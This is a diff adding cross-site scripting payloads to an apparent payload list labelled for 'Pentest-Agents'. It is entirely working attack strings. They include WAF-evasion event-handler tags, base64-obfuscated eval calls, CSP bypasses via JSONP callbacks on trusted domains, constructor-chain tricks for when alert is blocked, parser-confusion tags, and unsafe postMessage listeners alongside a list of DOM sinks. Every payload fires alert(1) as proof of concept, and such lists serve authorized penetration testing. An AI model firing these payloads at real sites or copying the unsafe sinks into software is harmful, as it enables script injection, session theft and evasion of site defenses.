@@ -329,3 +329,48 @@ javascript://%250Aalert(1)//"onclick=alert(1)//<svg/onload=alert(1)>
 \';alert(1)//
 \";alert(1)//
 `alert(1)`
+# Pentest-Agents WAF bypass payloads
+<details open ontoggle=alert(1)>
+<svg/onload=alert(1)>
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<math><mtext><table><mglyph><style><!--</style><img src onerror=alert(1)>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<marquee onstart=alert(1)>x</marquee>
+<video><source onerror=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><animateTransform onbegin=alert(1) attributeName=transform dur=1s>
+<svg><set onbegin=alert(1) attributeName=x to=y dur=1s>
+<style>@keyframes x{}</style><div onanimationstart=alert(1) style=animation:x\ 1s>
+<div onanimationend=alert(1) style=animation:spin\ 1s>
+<div ontransitionend=alert(1) style=transition:all\ 1s>
+# CSP JSONP bypass via trusted CDNs
+<script src="https://www.google.com/complete/search?client=chrome&jsonp=alert(1);"></script>
+<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1);"></script>
+<script src="https://api.github.com/repos/user/repo?callback=alert(1);"></script>
+# Constructor-chain when alert blocked
+[]['constructor']['constructor']('alert(1)')()
+({}).constructor.constructor('alert(1)')()
+new Function('alert(1)')()
+Reflect.construct(Function,['alert(1)'])()
+window[atob('YWxlcnQ=')](1)
+# Tag-confusion parser-differential
+<scr<script>ipt>alert(1)</script>
+<<script>alert(1)</script>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>"></p>
+# DOM XSS sinks
+element.innerHTML
+document.write()
+eval()
+setTimeout()
+jQuery .html() .append()
+React dangerouslySetInnerHTML
+Vue v-html
+Angular [innerHTML]
+# postMessage listener sinks
+window.addEventListener('message', e => Function(e.data)());
+window.onmessage = e => document.write(e.data);
